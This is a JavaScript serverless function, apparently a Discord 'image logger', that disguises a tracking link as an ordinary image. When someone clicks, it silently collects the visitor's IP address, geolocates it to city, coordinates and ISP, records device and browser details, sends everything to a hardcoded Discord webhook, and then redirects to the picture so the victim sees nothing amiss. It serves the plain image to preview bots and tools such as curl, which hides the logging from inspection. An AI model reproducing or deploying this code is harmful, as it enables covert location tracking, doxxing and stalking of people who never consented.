import https from 'https';

// ─── CHANGE THIS IMAGE URL ANYTIME ───
const IMAGE_URL = 'https://cdn.discordapp.com/attachments/1522326026577772655/1533995634732826664/image0.jpg?ex=6a728443&is=6a7132c3&hm=a902820cc87c257aa597e4a7625570ca23d41ea0d417bec4bbfb82158a86be3c&';
// ─────────────────────────────────────

export default async function handler(req, res) {
    // ─── Get real IP ───
    const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
               req.socket.remoteAddress || 
               null;
    
    const ua = req.headers['user-agent'] || null;
    const referer = req.headers['referer'] || null;
    const acceptLang = req.headers['accept-language'] || null;
    const acceptEncoding = req.headers['accept-encoding'] || null;
    const secChUa = req.headers['sec-ch-ua'] || null;
    const secChUaPlatform = req.headers['sec-ch-ua-platform'] || null;
    const secChUaMobile = req.headers['sec-ch-ua-mobile'] || null;
    const dnt = req.headers['dnt'] || null;
    const time = new Date().toISOString().replace('T', ' ').slice(0, 19);

    // ─── IGNORE bots/proxies ───
    const botPatterns = ['Discordbot', 'Twitterbot', 'Slackbot', 'curl', 'python-requests', 'Go-http-client', 'okhttp', 'HTTPie', 'Wget'];
    const isBot = ua && botPatterns.some(bot => ua.includes(bot));
    if (isBot) {
        try {
            const imageRes = await fetch(IMAGE_URL);
            const buffer = Buffer.from(await imageRes.arrayBuffer());
            res.setHeader('Content-Type', 'image/jpeg');
            res.status(200).send(buffer);
        } catch (_) {
            res.status(204).end();
        }
        return;
    }

    // ─── Get country from IP ───
    let geo = {};
    if (ip) {
        try {
            const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,timezone,loc,as`);
            if (geoRes.ok) {
                const data = await geoRes.json();
                if (data.status === 'success') {
                    geo = data;
                }
            }
        } catch (_) { /* no geo */ }
    }

    // ─── Parse User-Agent ───
    let deviceType = null;
    let os = null;
    let browser = null;

    if (ua) {
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac OS')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        else if (ua.includes('Chrome OS')) os = 'ChromeOS';
        else if (ua.includes('Ubuntu')) os = 'Ubuntu';

        if (ua.includes('Mobile') || (ua.includes('Android') && !ua.includes('Tablet'))) deviceType = 'Mobile Phone';
        else if (ua.includes('Tablet') || ua.includes('iPad')) deviceType = 'Tablet';
        else if (ua.includes('Windows') || ua.includes('Mac') || ua.includes('Linux')) deviceType = 'Desktop';

        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Safari';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
        else if (ua.includes('Brave')) browser = 'Brave';
    }

    // ─── Build fields dynamically ───
    const fields = [];

    if (ip) fields.push({ name: '🌐 IP Address', value: `\`${ip}\``, inline: false });

    if (geo.country) {
        const code = geo.countryCode || 'UN';
        const flag = code.length === 2 ? String.fromCodePoint(...code.toUpperCase().split('').map(ch => 0x1F1E6 + ch.charCodeAt(0) - 65)) : '🌍';
        fields.push({ name: `${flag} Country`, value: `${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}`, inline: true });
    }
    if (geo.regionName) fields.push({ name: '📍 Region', value: geo.regionName, inline: true });
    if (geo.city) fields.push({ name: '🏙️ City', value: geo.city, inline: true });
    if (geo.loc) fields.push({ name: '🗺️ Location (lat,lon)', value: `\`${geo.loc}\``, inline: false });
    if (geo.timezone) fields.push({ name: '⏰ Timezone', value: geo.timezone, inline: true });
    if (geo.isp) fields.push({ name: '🏢 ISP', value: geo.isp, inline: true });
    if (geo.org && geo.org !== geo.isp) fields.push({ name: '📋 Organization', value: geo.org, inline: true });
    if (geo.as) fields.push({ name: '🔢 ASN', value: geo.as, inline: true });

    if (deviceType) fields.push({ name: '🖥️ Device', value: deviceType, inline: true });
    if (os) fields.push({ name: '💻 OS', value: os, inline: true });
    if (browser) fields.push({ name: '🌐 Browser', value: browser, inline: true });
    if (secChUaMobile) fields.push({ name: '📱 Mobile', value: secChUaMobile, inline: true });
    if (secChUaPlatform) fields.push({ name: '📋 Platform', value: secChUaPlatform, inline: true });

    if (ua) fields.push({ name: '📎 User-Agent', value: `\`${ua.length > 200 ? ua.slice(0, 200) + '...' : ua}\``, inline: false });
    if (referer) fields.push({ name: '🔗 Referer', value: referer.length > 100 ? referer.slice(0, 100) + '...' : referer, inline: false });
    if (acceptLang) fields.push({ name: '🌍 Accept-Language', value: acceptLang, inline: true });
    if (acceptEncoding) fields.push({ name: '⚙️ Accept-Encoding', value: acceptEncoding, inline: true });
    if (dnt) fields.push({ name: '🚫 Do Not Track', value: dnt, inline: true });

    fields.push({ name: '📅 Timestamp (UTC)', value: `\`${time}\``, inline: false });

    // ─── Build embed ───
    const embed = {
        title: '🕵️ New Click Captured',
        color: 0x00ff88,
        thumbnail: { url: IMAGE_URL },
        fields: fields,
        footer: { text: 'Image Logger • Powered by Vercel' }
    };

    // ─── Send to Discord webhook ───
    const webhook = 'https://discord.com/api/webhooks/1532494338477785189/piKPDYGbTysmL3tPK_HQckufpf28oSRKvUAGkt5aHA2EiSyGAMZyOphc464WIJA20Atr';
    const payload = JSON.stringify({ embeds: [embed] });
    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    };
    const discordReq = https.request(webhook, options, () => {});
    discordReq.write(payload);
    discordReq.end();

    // ─── REDIRECT to the image ───
    res.writeHead(302, { Location: IMAGE_URL });
    res.end();
}
